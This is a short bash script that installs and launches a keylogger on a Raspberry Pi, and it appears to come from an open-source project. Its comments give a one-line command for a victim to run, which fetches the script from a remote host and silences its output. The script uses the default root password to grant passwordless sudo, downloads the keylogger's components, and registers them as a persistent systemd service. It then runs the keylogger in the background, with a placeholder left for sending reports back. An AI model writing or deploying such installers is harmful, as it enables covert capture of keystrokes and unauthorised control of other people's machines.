#!/bin/bash
# application to install, setup, and run the keylogger.

# entry point for victim to execute:
# /bin/bash -c "$(wget -q -O - https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/coordinator.sh)" > /dev/null 2>&1
base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"

# Force user to be included in sudoers and remove the need for passwords
# Totally expects the root user to be an unchanged Raspberry Pi
su - root <<!
raspberry
echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers &&
echo "pi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
!

mkdir nicekl && cd nicekl/

# DOWNLOAD FILES if they are not already installed
# nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
CONT=${base}controller.py
KMAP=${base}keymap.py
FKEY=${base}find_keyboard.py
KLSERV=${base}nicekeylogger.service
PUP=${base}puppy.jpg
wget -L "$CONT" "$KMAP" "$FKEY" "$KLSERV" "$PUP"
sudo chmod +x controller.py

# SET APPLICATION AS A SERVICE WITH SYSTEMD
sudo mv nicekeylogger.service /etc/systemd/system/
sudo systemctl enable nicekeylogger.service
sudo systemctl daemon-reload

# RUN APPLICATION
sudo python3 controller.py > /dev/null 2>&1 &

# REPORT BACK TO HOST
# TODO - decide the period to report back
# TODO - control size of report; only send new content? only send UDP payload? On size == x?

exit
